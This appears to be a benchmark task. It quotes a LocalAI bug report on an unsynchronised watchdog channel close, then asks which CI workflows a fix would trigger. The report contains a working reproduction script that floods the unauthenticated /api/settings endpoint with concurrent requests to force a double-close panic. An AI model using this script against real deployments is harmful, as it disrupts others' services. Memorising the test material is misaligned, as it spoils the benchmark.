# Recover the symbolic verification state this change produces

A regression report was filed against `mudler/LocalAI`.  The report is quoted verbatim below.

## Report

```
Bug 2: Unsynchronized `watchdogStop` access causes a panic via `POST /api/settings`

**LocalAI version:**
commit `05b8d8aafe91401938622e1759c7dbf9425c8a95` (master, 2026-07-14)

**Environment, CPU architecture, OS, and Version:**
Linux 6.8.0-55-generic, x86_64, Docker container built with `-race` instrumentation. Not architecture specific.

**Describe the bug**

`core/application/watchdog.go` mutates `Application.watchdogStop` with inconsistent locking. `StopWatchdog()` reads and closes `a.watchdogStop` without taking `a.watchdogMutex` (watchdog.go:65-67). `RestartWatchdog()`/`startWatchdog()` close and reassign the same channel while holding the mutex (watchdog.go:99, 166).

Both are reachable from `POST /api/settings`. Whether `watchdog_idle_enabled`/`watchdog_busy_enabled` end up making `ApplicationConfig.WatchdogShouldRun()` true or false decides between `RestartWatchdog()` (locked) and `StopWatchdog()` (unlocked) (`core/http/endpoints/localai/settings.go:244-259`). A concurrent unlocked close racing a locked close on the same channel is a double-close, which panics in Go. This is CWE-362 with a directly observable crash consequence, not just a benign race.

The route needs no authentication by default, same as Bug 1, `adminMiddleware` resolves to `auth.NoopMiddleware()` when no `--api-keys`/auth DB is configured.

**To Reproduce**

```bash
# 1. Build a -race instrumented local-ai image
git clone --depth 1 https://github.com/mudler/LocalAI.git /tmp/localai-race
cd /tmp/localai-race

cat > Dockerfile.race <<'EOF'
FROM golang:1.23-bookworm AS build
WORKDIR /src
COPY . .
RUN go build -race -o /usr/local/bin/local-ai ./cmd/local-ai

FROM debian:bookworm-slim
COPY --from=build /usr/local/bin/local-ai /usr/local/bin/local-ai
ENTRYPOINT ["/usr/local/bin/local-ai"]
EOF

docker build -t localai-race:latest -f Dockerfile.race .

# 2. Start the victim with the watchdog enabled and no auth configured
mkdir -p /tmp/localai-race-models
docker run -d --rm --name localai-race-watchdog \
    -p 8080:8080 \
    -v /tmp/localai-race-models:/models \
    localai-race:latest run \
    --address 0.0.0.0:8080 \
    --models-path /models \
    --api-keys "" \
    --enable-watchdog-idle --enable-watchdog-busy \
    --watchdog-idle-timeout 30m --watchdog-busy-timeout 15m

until curl -s -o /dev/null -w '%{http_code}' http://127.0.0.1:8080/readyz | grep -q 200; do sleep 1; done

# 3. Each round first re-enables/restarts the watchdog, creating a fresh
#    a.watchdogStop channel, then releases many STOP requests at once.
#    The STOP requests all enter StopWatchdog(), which checks and closes
#    a.watchdogStop without a.watchdogMutex. If two handlers observe the
#    same non-nil channel, the second close panics with "close of closed channel".
STOP='{"watchdog_idle_enabled":false,"watchdog_busy_enabled":false}'
RESTART='{"watchdog_idle_enabled":true,"watchdog_busy_enabled":true,"watchdog_idle_timeout":"5m","watchdog_busy_timeout":"2m"}'

# Stream logs while hammering, so the panic evidence is retained even if
# the process or container exits.
docker logs -f localai-race-watchdog > /tmp/localai-race-watchdog.log 2>&1 &
LOG_PID=$!

for round in $(seq 1 300); do
  curl -s -m 3 -o /dev/null -H "Content-Type: application/json" \
    -X POST -d "$RESTART" http://127.0.0.1:8080/api/settings || true

  gate="/tmp/localai-watchdog-stop-gate-$round"
  rm -f "$gate"

  for w in $(seq 1 48); do
    (
      while [ ! -e "$gate" ]; do :; done
      curl -s -m 3 -o /dev/null -H "Content-Type: application/json" \
        -X POST -d "$STOP" http://127.0.0.1:8080/api/settings || true
    ) &
  done

  touch "$gate"
  wait
  rm -f "$gate"

  docker logs localai-race-watchdog >> /tmp/localai-race-watchdog.log 2>&1 || true
  if grep -qE "PANIC RECOVER|panic: close of closed channel|close of closed channel" /tmp/localai-race-watchdog.log; then
    echo "panic reproduced in round $round"
    break
  fi
done

kill "$LOG_PID" 2>/dev/null || true
wait "$LOG_PID" 2>/dev/null || true

# 4. Check the container logs for the recovered panic and race detector report.
grep -nE "PANIC RECOVER|panic: close of closed channel|close of closed channel|WARNING: DATA RACE" \
  /tmp/localai-race-watchdog.log | head -80
```

**Expected behavior**

Concurrent `POST /api/settings` requests toggling the watchdog should serialize access to `Application.watchdogStop`, no panic or data race should occur regardless of request timing.

**Logs**

```
{"level":"-","prefix":"echo","message":"[PANIC RECOVER] close of closed channel goroutine 345 [running]:
github.com/mudler/LocalAI/core/http.API.Recover.RecoverWithConfig.func37.1.1()
	/go/pkg/mod/github.com/labstack/echo/v4@v4.15.1/middleware/recover.go:99 +0x285
panic({0x60ba8c0?, 0x87c89c0?})
	/usr/local/go/src/runtime/panic.go:860 +0x13a
github.com/mudler/LocalAI/core/application.(*Application).StopWatchdog(0xc001550dc0)
	/src/core/application/watchdog.go:66 +0x66
github.com/mudler/LocalAI/core/http/routes.RegisterUIAPIRoutes.UpdateSettingsEndpoint.func32(...)
	/src/core/http/endpoints/localai/settings.go:245 +0x20f9
... (echo middleware chain) ...
net/http.(*conn).serve(...)
	/usr/local/go/src/net/http/server.go:2073 +0xda5
"}

WARNING: DATA RACE
Read at 0x00c0014454e8 by goroutine 318:
  github.com/mudler/LocalAI/core/application.(*Application).StopWatchdog()
      /src/core/application/watchdog.go:65 +0x3b
  ...UpdateSettingsEndpoint.func32()
      /src/core/http/endpoints/localai/settings.go:245 +0x20f8

Previous write at 0x00c0014454e8 by goroutine 315:
  github.com/mudler/LocalAI/core/application.(*Application).RestartWatchdog()
      /src/core/application/watchdog.go:166 +0x1d1
  ...UpdateSettingsEndpoint.func32()
      /src/core/http/endpoints/localai/settings.go:253 +0x1f27
```

**Additional context**

Because the panic is recovered per-request by echo's `Recover` middleware, the server process does not crash outright, the request that hit the double-close returns a 500 and the process keeps serving. The underlying defect is real and repeatable: an attacker can repeatedly re-enable the watchdog to create a fresh stop channel, then release a burst of concurrent disable requests so multiple handlers attempt to close that same channel.
```

## What you have

- `/testbed/repo` is the repository checked out at the **pre-change** commit `6a985d13ea4e0013b9bde5f2d47e6abc61143d5f`.  There
  is no git history: read the files directly.
- The pull request that actually fixed this issue is **not** in the container and cannot be fetched.

## Evaluation context

Assume the prospective fix has just **updated an existing non-draft pull request**.

- PR lifecycle action: `synchronize`
- target branch: `master`
- consider both `pull_request` and `pull_request_target` trigger families
- apply the repository's native `types`, `branches`, `branches-ignore`, `paths`, `paths-ignore`
- direct workflow activation only; no push/workflow_dispatch/schedule/workflow_run

## What to produce

Write JSON to `/testbed/answer.json`:

```json
{"case_id": "mudler_LocalAI__10841__6a985d1",
  "activated_workflows": [".github/workflows/test.yml"]}
```

- list every workflow under `repo/.github/workflows/` that this change would activate
- workflow paths exactly as under `repo/.github/workflows/`; a path that does not exist scores 0

## Rules

- Do **not** use the network. Fetching the upstream fix is cheating and is detected.
- Solve it from the repository.
